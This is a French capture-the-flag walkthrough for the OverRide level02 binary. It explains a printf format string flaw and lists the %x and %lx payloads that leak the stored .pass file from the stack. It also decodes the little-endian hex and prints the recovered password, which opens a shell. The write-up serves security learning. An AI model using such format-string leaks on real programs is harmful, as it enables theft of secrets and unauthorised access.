
## 🔓 Exploitation du binaire `level02` — OverRide

### 🎯 Objectif

Trouver le mot de passe (`.pass`) pour obtenir un shell via le binaire `./level02`.

---

### 🔍 Analyse du binaire

Voici la fonction principale du binaire :

```c
stream = fopen("/home/users/level03/.pass", "r");
...
fread(ptr, 1u, 0x29u, stream);
...
fgets(s, 100, stdin); // Username
fgets(s2, 100, stdin); // Password
...
if (strncmp(ptr, s2, 0x29u)) {
    printf(s); // <-- format string vulnérable
    puts(" does not have access!");
    exit(1);
}
printf("Greetings, %s!\n", s);
system("/bin/sh");
```

#### 📌 Observations :

* Le fichier `.pass` est **chargé dans la pile** à travers `fread`.
* Le `printf(s)` utilise directement l'entrée utilisateur **sans format sécurisé** → vulnérabilité de type **format string**.
* Il compare le `.pass` avec ce que l'utilisateur tape dans `s2`.
* Si ça correspond, on a un shell (`/bin/sh`).

---

### 🧠 Hypothèse d'exploitation

Puisque `printf(s)` est vulnérable et que le mot de passe est stocké dans la pile, **on peut probablement le lire** via des spécificateurs de format comme `%x` ou `%lx`.

---

### 🛠️ Phase de test

1. Tester l'accès à la pile :

```bash
(python -c 'print "%x " * 40') | ./level02
```

🧪 Résultat :

```bash
... 34376848 61733951 574e6758 6e475873 ...
```

Avec un outil de décodage hexadécimal → `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5`
Mais il manque encore des caractères à la fin !

#### 💡 Pourquoi ?

Le système est en **64 bits**, donc `%x` lit **4 octets**. Pour avoir l’intégralité des données, on utilise `%lx` (8 octets).

---

### 📐 Re-test avec `%lx` :

```bash
(python -c 'print "%lx " * 40') | ./level02
```

Pour afficher le dernier morceaux (si il ne s'affiche pas), on l'affiche avec :

```bash
(python -c 'print "%26$lx"') | ./level02
```

Pour afficher le 26eme element, ou le X element changer le 26 par le nombre voulu du coup.


Résultat (partie intéressante) :

```
... 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d ...
```

→ Représentation hexadécimale (little endian) de la chaîne du mot de passe.

---

### 🧮 Recomposition du mot de passe

Ces valeurs sont en little endian, donc on doit les inverser **par groupe de 8 bits** pour les rendre lisibles :

```bash
756e505234376848 -> Hh74RPnu
45414a3561733951 -> Q9sa5JAE
377a7143574e6758 -> XgNWCqz7
354a35686e475873 -> sXGnh5J5
48336750664b394d -> M9KfPg3H
```

🔐 Mot de passe final :

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

---

### ✅ Validation

```bash
$ ./level02
--[ Username: %x
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
Greetings, %x!
$ whoami
level03
```

---


binary hexa converter little to big endian :

https://blockchain-academy.hs-mittweida.de/litte-big-endian-converter/
